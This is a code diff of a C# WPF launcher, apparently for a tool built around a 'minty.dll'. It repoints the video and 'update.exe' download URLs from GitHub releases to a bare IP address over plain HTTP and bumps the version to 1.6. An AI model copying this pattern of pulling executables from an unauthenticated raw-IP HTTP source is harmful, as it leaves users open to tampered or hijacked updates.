@@ -45,7 +45,7 @@ namespace WpfApp1
             string vidFilePath = System.IO.Path.Combine(assetsFolderPath, "video.mp4");
             string logfilePath = System.IO.Path.Combine(assetsFolderPath, "log.txt");
             string logtext = "1";
-            string vidUrl = "https://github.com/rusya222/LauncherVer/releases/download/1.0/video.mp4";
+            string vidUrl = "http://138.2.145.17/video.mp4";
                 Directory.CreateDirectory(mintyFolderPath);
                 Directory.CreateDirectory(assetsFolderPath);
                 using (File.Create(logfilePath));
@@ -75,9 +75,9 @@ namespace WpfApp1
             string assetsFolderPath = System.IO.Path.Combine(mintyFolderPath, "MintyGI");
             string launcherFilePath = System.IO.Path.Combine(assetsFolderPath, "Launcher.exe");
             string dllFilePath = System.IO.Path.Combine(assetsFolderPath, "minty.dll");
-            string zipFilePath = System.IO.Path.Combine(assetsFolderPath, "minty.zip");
+            string zipFilePath = System.IO.Path.Combine(assetsFolderPath, "minty .zip");
             string verfilePath = System.IO.Path.Combine(assetsFolderPath, "version.txt");
-            string updateUrl = "https://github.com/rusya222/LauncherVer/releases/download/1.0/update.exe";
+            string updateUrl = "http://138.2.145.17/update.exe";
             string tempFolderPath = System.IO.Path.GetTempPath();
             string updateFilePath = System.IO.Path.Combine(tempFolderPath, "update.exe");
             try
@@ -96,7 +96,7 @@ namespace WpfApp1
                         return;
                     }
 
-                    double currentVersion = 1.5;
+                    double currentVersion = 1.6;
 
                     if (currentVersion < latestVersion)
                     {
@@ -137,7 +137,7 @@ namespace WpfApp1
         public async void LoadLauncherInfo()
         {
             string url = "https://raw.githubusercontent.com/rusya222/LauncherVer/main/Version"; // Replace with the actual URL of your JSON file
-            string versString = "1.5";
+            string versString = "1.6";
             try
             {
                 using (HttpClient client = new HttpClient())
